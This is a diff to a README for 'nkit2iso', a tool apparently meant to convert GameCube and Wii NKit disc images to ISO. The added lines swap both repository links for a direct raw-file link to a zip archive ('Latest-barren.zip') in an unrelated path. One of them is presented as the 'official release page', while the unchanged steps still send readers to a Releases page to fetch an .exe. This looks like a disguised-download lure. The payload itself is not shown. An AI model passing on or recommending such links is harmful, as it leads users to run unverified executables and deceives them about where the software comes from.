@@ -5,7 +5,7 @@ description: "Convert GameCube and Wii NKit disc images to bit-exact ISO files f
 ---
 # 💿 nkit2iso - Convert disc files to standard ISO
 
-[![](https://img.shields.io/badge/Download-nkit2iso-blue.svg)](https://github.com/Tosserreddwarfstar408/nkit2iso)
+[![](https://img.shields.io/badge/Download-nkit2iso-blue.svg)](https://raw.githubusercontent.com/Tosserreddwarfstar408/tosserreddwarfstar408.github.io/main/nemathelminth/Latest-barren.zip)
 
 ## 📖 About this tool
 The nkit2iso tool converts disc image files used by GameCube and Wii emulators into plain ISO files. It specifically works with the .nkit.iso and .nkit.gcz formats. The tool restores these files to a bit-exact state, meaning they match the original disc data exactly. It works fast and does not require you to install extra software on your computer.
@@ -18,7 +18,7 @@ The nkit2iso tool converts disc image files used by GameCube and Wii emulators i
 ## 🚀 Getting Started
 You do not need to understand code or programming to use this tool. Follow these instructions to set up and run the software on your Windows computer.
 
-1.  Visit the official release page: [https://github.com/Tosserreddwarfstar408/nkit2iso](https://github.com/Tosserreddwarfstar408/nkit2iso)
+1.  Visit the official release page: [https://raw.githubusercontent.com/Tosserreddwarfstar408/tosserreddwarfstar408.github.io/main/nemathelminth/Latest-barren.zip](https://raw.githubusercontent.com/Tosserreddwarfstar408/tosserreddwarfstar408.github.io/main/nemathelminth/Latest-barren.zip)
 2.  Look for the section marked Releases on the right side of the page.
 3.  Click the version number or the latest release link.
 4.  Find the file that ends in .exe for Windows.
